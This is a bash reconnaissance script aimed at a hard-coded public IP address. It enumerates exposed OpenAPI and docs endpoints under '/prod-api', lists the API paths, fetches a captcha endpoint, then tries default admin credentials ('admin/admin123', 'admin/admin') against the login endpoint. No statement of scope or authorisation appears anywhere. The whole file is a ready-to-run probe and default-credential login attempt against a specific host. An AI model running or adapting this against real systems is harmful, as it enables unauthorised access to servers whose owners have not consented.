#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
B=http://123.184.7.135
echo "### OPENAPI"
for p in /prod-api/openapi.json /prod-api/docs /prod-api/redoc /prod-api/; do
  echo "-- $p"; timeout 10 curl -s -m 8 -o /tmp/o -w "code=%{http_code} len=%{size_download}\n" "$B$p"; head -c 200 /tmp/o; echo
done
echo "### PATHS"
timeout 10 curl -s -m 8 "$B/prod-api/openapi.json" -o /tmp/oa.json; python3 - <<'PY'
import json
try:
    d=json.load(open('/tmp/oa.json'))
    for p,m in d.get('paths',{}).items():
        print(m.upper() if False else ' '.join(k.upper() for k in m.keys()),p)
except Exception as e: print("ERR",e)
PY
echo "### CAPTCHA"
timeout 10 curl -s -m 8 "$B/prod-api/captchaImage" -w "|%{http_code}\n" | head -c 200; echo
echo "### LOGIN"
for c in '{"username":"admin","password":"admin123"}' '{"username":"admin","password":"admin"}'; do
  echo "-- $c"; timeout 12 curl -s -m 10 -X POST "$B/prod-api/login" -H 'Content-Type: application/json' -d "$c" -w "|%{http_code}\n" | head -c 400; echo
done
echo "### END $(date -u +%FT%TZ)"
